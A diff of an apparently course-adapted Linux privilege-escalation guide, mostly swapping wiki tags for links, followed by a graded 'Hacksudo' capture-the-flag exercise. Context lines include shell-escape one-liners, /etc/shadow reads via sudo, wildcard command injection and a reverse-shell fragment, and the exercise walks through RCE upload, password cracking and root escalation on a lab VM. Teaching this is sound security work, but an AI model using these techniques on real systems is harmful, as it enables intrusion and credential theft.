@@ -156,7 +156,7 @@ cat /proc/sys/kernel/randomize_va_space 2>/dev/null
 
 If you are inside a docker container you can try to escape from it:
 
-{% page-ref page="docker-breakout.md" %}
+[https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout](https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout)
 
 ## Drives
 
@@ -197,7 +197,7 @@ rpm -qa #Centos
 
 If you have SSH access to the machine you could also use **openVAS** to check for outdated and vulnerable software installed inside the machine.
 
-{% hint style="info" %} *Note that these commands will show a lot of information that will mostly be useless, therefore it's recommended some application like OpenVAS or similar that will check if any installed software version is vulnerable to known exploits* {% endhint %}
+*Note that these commands will show a lot of information that will mostly be useless, therefore it's recommended some application like OpenVAS or similar that will check if any installed software version is vulnerable to known exploits*
 
 ## Processes
 
@@ -237,8 +237,6 @@ strings /tmp/mem_ftp #User and password
 
 #### GDB Script
 
-{% code title="dump-memory.sh" %}
-
 ```
 #!/bin/bash
 #./dump-memory.sh <PID>
@@ -249,8 +247,6 @@ grep rw-p /proc/$1/maps \
     "dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
 done
 ```
-
-{% endcode %}
 
 #### /proc/$pid/maps & /proc/$pid/mem
 
@@ -277,8 +273,6 @@ Typically, `/dev/mem` is only readable by **root** and **kmem** group.
 ```
 strings /dev/mem -n10 | grep -i PASS
 ```
-
-#### 
 
 #### Tools
 
@@ -334,7 +328,7 @@ For example, inside */etc/crontab* you can find the PATH: *PATH=**/home/user**:/
 
 (*Note how the user "user" has writing privileges over /home/user*)
 
-If inside this crontab the root user tries to execute some command or script without setting the path. For example: ** \* * \* root overwrite.sh*
+If inside this crontab the root user tries to execute some command or script without setting the path. For example: `root overwrite.sh`
 Then, you can get a root shell by using:
 
 ```
@@ -355,7 +349,7 @@ rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh mys
 
 Read the following page for more wildcard exploitation tricks:
 
-{% page-ref page="wildcards-spare-tricks.md" %}
+[https://book.hacktricks.xyz/linux-unix/privilege-escalation/wildcards-spare-tricks](https://book.hacktricks.xyz/linux-unix/privilege-escalation/wildcards-spare-tricks)
 
 ### Cron script overwriting and symlink
 
@@ -506,7 +500,7 @@ socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of 
 
 **Exploitation example:**
 
-{% page-ref page="socket-command-injection.md" %}
+[https://book.hacktricks.xyz/linux-unix/privilege-escalation/socket-command-injection](https://book.hacktricks.xyz/linux-unix/privilege-escalation/socket-command-injection)
 
 ### HTTP sockets
 
@@ -570,19 +564,19 @@ Note that if you have write permissions over the docker socket because you are *
 
 If you find that you can use the **`ctr`** command read the following page as **you may be able to abuse it to escalate privileges**:
 
-{% page-ref page="containerd-ctr-privilege-escalation.md" %}
+[https://book.hacktricks.xyz/linux-unix/privilege-escalation/containerd-ctr-privilege-escalation](https://book.hacktricks.xyz/linux-unix/privilege-escalation/containerd-ctr-privilege-escalation)
 
 ### **RunC** privilege escalation
 
 If you find that you can use the **`runc`** command read the following page as **you may be able to abuse it to escalate privileges**:
 
-{% page-ref page="runc-privilege-escalation.md" %}
+[https://book.hacktricks.xyz/linux-unix/privilege-escalation/runc-privilege-escalation](https://book.hacktricks.xyz/linux-unix/privilege-escalation/runc-privilege-escalation)
 
 ## **D-Bus**
 
 D-BUS is an **inter-process communication (IPC) system**, providing a simple yet powerful mechanism **allowing applications to talk to one another**, communicate information and request services. D-BUS was designed from scratch to fulfil the needs of a modern Linux system.
 
-D-BUS, as a full-featured IPC and object system, has several intended uses. First, D-BUS can perform basic application IPC, allowing one process to shuttle data to another—think **UNIX domain sockets on steroids**. Second, D-BUS can facilitate sending events, or signals, through the system, allowing different components in the system to communicate and ultimately to integrate better. For example, a Bluetooth dæmon can send an incoming call signal that your music player can intercept, muting the volume until the call ends. Finally, D-BUS implements a remote object system, letting one application request services and invoke methods from a different object—think CORBA without the complications. ****(From [here](https://www.linuxjournal.com/article/7744)).
+D-BUS, as a full-featured IPC and object system, has several intended uses. First, D-BUS can perform basic application IPC, allowing one process to shuttle data to another—think **UNIX domain sockets on steroids**. Second, D-BUS can facilitate sending events, or signals, through the system, allowing different components in the system to communicate and ultimately to integrate better. For example, a Bluetooth daemon can send an incoming call signal that your music player can intercept, muting the volume until the call ends. Finally, D-BUS implements a remote object system, letting one application request services and invoke methods from a different object—think CORBA without the complications. (From [here](https://www.linuxjournal.com/article/7744)).
 
 D-Bus uses an **allow/deny model**, where each message (method call, signal emission, etc.) can be **allowed or denied** according to the sum of all policy rules which match it. Each or rule in the policy should have the `own`, `send_destination` or `receive_sender` attribute set.
 
@@ -604,7 +598,7 @@ Policies to the context "default" affects everyone not affected by other policie
 
 **Learn how to enumerate and exploit a D-Bus communication here:**
 
-{% page-ref page="d-bus-enumeration-and-command-injection-privilege-escalation.md" %}
+[https://book.hacktricks.xyz/linux-unix/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation](https://book.hacktricks.xyz/linux-unix/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation)
 
 ## **Network**
 
@@ -689,7 +683,7 @@ Some Linux versions were affected by a bug that allow users with **UID > INT_MAX
 
 Check if you are a **member of some group** that could grant you root privileges:
 
-{% page-ref page="interesting-groups-linux-pe/" %}
+[https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe](https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe)
 
 ### Clipboard
 
@@ -797,7 +791,7 @@ sudo less /var/log/../../etc/shadow #Read shadow
 sudo less /var/log/something /etc/shadow #Red 2 files
 ```
 
-**Countermeasures**: https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/
+**Countermeasures**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)
 
 ### Sudo command/SUID binary without command path
 
@@ -908,7 +902,7 @@ The project collects legitimate functions of Unix binaries that can be abused to
 > strace -o /dev/null /bin/sh
 > sudo awk 'BEGIN {system("/bin/sh")}'
 
-{% embed url="https://gtfobins.github.io/" caption="" %}
+[https://gtfobins.github.io/](https://gtfobins.github.io/)
 
 ### FallOfSudo
 
@@ -1011,7 +1005,7 @@ That means that the configuration files from `/etc/ld.so.conf.d/*.conf` will be 
 If for some reason **a user has write permissions** on any of the paths indicated: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, any file inside `/etc/ld.so.conf.d/` or any folder indicated inside any config file inside `/etc/ld.so.conf.d/*.conf` he may be able to escalate privileges.
 Take a look about **how to exploit this misconfiguration** in the following page:
 
-{% page-ref page="ld.so.conf-example.md" %}
+[https://book.hacktricks.xyz/linux-unix/privilege-escalation/ld.so.conf-example](https://book.hacktricks.xyz/linux-unix/privilege-escalation/ld.so.conf-example)
 
 ### RPATH
 
@@ -1057,7 +1051,7 @@ int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp
 Linux capabilities provide a **subset of the available root privileges to a process**. This effectively breaks up root **privileges into smaller and distinctive units**. Each of these units can then be independently be granted to processes. This way the full set of privileges is reduced and decreasing the risks of exploitation.
 Read the following page to **learn more about capabilities and how to abuse them**:
 
-{% page-ref page="linux-capabilities.md" %}
+[https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities](https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities)
 
 ## Directory permissions
 
@@ -1155,7 +1149,7 @@ Specifies files that contains the public keys that can be used for user authenti
 AuthorizedKeysFile    .ssh/authorized_keys access
 ```
 
-That configuration will indicate that if you try to login with the **private** key ****of the user "**testusername**" ssh is going to compare the public key of your key with the ones located in `/home/testusername/.ssh/authorized_keys` and `/home/testusername/access`
+That configuration will indicate that if you try to login with the **private** key of the user "**testusername**" ssh is going to compare the public key of your key with the ones located in `/home/testusername/.ssh/authorized_keys` and `/home/testusername/access`
 
 #### ForwardAgent/AllowAgentForwarding
 
@@ -1376,7 +1370,7 @@ import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s
 There is a vulnerability on `logrotate`that allows a user with **write permissions over a log file** or **any** of its **parent directories** to make `logrotate`write **a file in any location**. If **logrotate** is being executed by **root**, then the user will be able to write any file in ***/etc/bash_completion.d/*** that will be executed by any user that login.
 So, if you have **write perms** over a **log file** **or** any of its **parent folder**, you can **privesc** (on most linux distributions, logrotate is executed automatically once a day as **user root**). Also, check if apart of */var/log* there are more files being **rotated**.
 
-{% hint style="info" %} This vulnerability affects `logrotate` version `3.15.1` and below {% endhint %}
+*This vulnerability affects `logrotate` version `3.15.1` and below*
 
 More detailed information about the vulnerability can be found in this page: https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition.
 
@@ -1402,7 +1396,7 @@ DEVICE=eth0
 
 (*Note the black space between Network and /bin/id*)
 
-**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)****
+**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
 
 ### **init, init.d, systemd, and rc.d**
 
@@ -1418,15 +1412,15 @@ Files that ships in packages downloaded from distribution repository go into `/u
 
 ### NFS Privilege escalation
 
-{% page-ref page="nfs-no_root_squash-misconfiguration-pe.md" %}
+[https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe](https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe)
 
 ### Escaping from restricted Shells
 
-{% page-ref page="escaping-from-limited-bash.md" %}
+[https://book.hacktricks.xyz/linux-unix/privilege-escalation/escaping-from-limited-bash](https://book.hacktricks.xyz/linux-unix/privilege-escalation/escaping-from-limited-bash)
 
 ### Cisco - vmanage
 
-{% page-ref page="cisco-vmanage.md" %}
+[https://book.hacktricks.xyz/linux-unix/privilege-escalation/cisco-vmanage](https://book.hacktricks.xyz/linux-unix/privilege-escalation/cisco-vmanage)
 
 ### Kernel Security Protections
 
@@ -1463,3 +1457,109 @@ https://touhidshaikh.com/blog/?p=827
 https://github.com/frizb/Linux-Privilege-Escalation
 https://github.com/lucyoa/kernel-exploits
 https://github.com/rtcrowley/linux-private-i
+
+## Exercise
+
+### (10 pt) Hacksudo
+
+In this challenge, you need to download the following virtual machine to finish the challenges.
+
+The box was created with `Virtualbox`. Upon booting up use `netdiscover` tool to find the IP address. This is the target address based on whatever settings you have. You should verify the address just in case.
+
+You don't need to answer all questions in order. Skip some questions may not affect the next steps.
+
+Download: [https://mega.nz/file/ix9VnA7Y#7LM1LXBta_kAeNrajXGkQhmwfbr5fIaQHykkWEPBjZY](https://mega.nz/file/ix9VnA7Y#7LM1LXBta_kAeNrajXGkQhmwfbr5fIaQHykkWEPBjZY)
+
+Mirror: [https://pan.baidu.com/s/1D-YEa6cr3rcWXv49HgZtSw](https://pan.baidu.com/s/1D-YEa6cr3rcWXv49HgZtSw) (Code: 1337)
+
+#### (1 pt) Port scan
+
+After the port scan, you should find several services running in the box. What's the version of the `mysql` service?
+
+Answer: `x.x.x-xx.x.xx-MariaDB-x+debxxxx` (replace all x to your answer)
+
+*Hint: you can use nmap for port scanning.*
+
+#### (1 pt) Web source code
+
+Access the website on port `80`. You can find here's some hint for the subsequent steps. What's the GitHub repo address you found in the source code?
+
+Answer: `https://github.com/xxxxxxxx/xxxxxxxxxxx` (replace all x to your answer)
+
+*Hint: press F12 on the keyboard to open the Developer's Tools to view the source code (may vary for different browsers).*
+
+#### (1 pt) Web directory discover
+
+Using web directory scanning, you can find a `txt` file under the website. What's the name of this `txt` file?
+
+Answer: `xxxx.txt` (replace all x to your answer)
+
+*Hint: gobuster and dirbuster are both good web directory/file discovery tools.*
+
+#### (1 pt) CMS vulnerability
+
+The CMS used in the website is `CMS-MadeSimple`. However, this CMS can be vulnerable in some versions. What's the version of CMS?
+
+Answer: `x.x.x` (replace all x to your answer)
+
+*Hint: you can use whatweb to find out the version of services.*
+
+#### (1 pt) Exploit CMS
+
+Now, using the vulnerability to find the username and the hashed password of the CMS. It's hard to break the hash string, but you can use this username to break other services on the server. The `txt` file you found above would help you to get the password for the `ftp` service on port `21`.
+
+What's the password (in plain text)?
+
+Answer: `xxxxxx` (replace all x to your answer)
+
+*Hint: hydra is a widely used tool for password cracking.*
+
+#### (1 pt) FTP and unzip
+
+Using the previous username and password, you can log into the FTP server. You may notice there's a `zip` file on the server. You need to break the password of the `zip` file.
+
+What's the password for the `zip` file?
+
+Answer: `xxxxxx` (replace all x to your answer)
+
+*Hint: to crack the password of the zip files, you can check JohnTheRipper.*
+
+#### (1 pt) Caesar Cipher
+
+After extracting the `hacksudoSTEGNO.wav`, you need to find what's inside this file. Recall what you've got till now, and find the CMS password.
+
+What's the password for CMS?
+
+Answer: `xxxxxxxxxxxx` (replace all x to your answer)
+
+*Hint: CyberChef contains many useful cryptography tools.*
+
+#### (1 pt) Upload RCE script
+
+You've got the CMS! Now you can enjoy accessing all website pages and put your files on the website. Why not let us dig deeper?
+
+Upload a PHP script to give you shell access.
+
+What's the first line of `flag2.txt` on the server?
+
+Answer: `xxx xxxxxxxxxxxx xxxxx xxx xxx xxx xxxxx xxxxxx!!!` (replace all x to your answer)
+
+*Hint: here are some upload limits on the server. Find out how to bypass them.*
+
+*Hint: after uploading your RCE script, you can generate a reversed shell to get a pty shell (which would simplify your next steps).*
+
+#### (1 pt) Local privilege escalation
+
+User `isro` is your first target. Attack and switch to user `isro`. View the files of `isro`. What's the content of `user.txt`?
+
+Answer: `xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx` (replace all x to your answer)
+
+*Hint: /etc/shadow is a sensitive file and may contain a user hashed password.*
+
+#### (1 pt) Root privilege escalation
+
+The final step: get `root` privilege. What's the content in the `root.txt`?
+
+Answer: `flag{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}` (replace all x to your answer)
+
+*Hint: sudo has some suid things and you should take a look at them.*
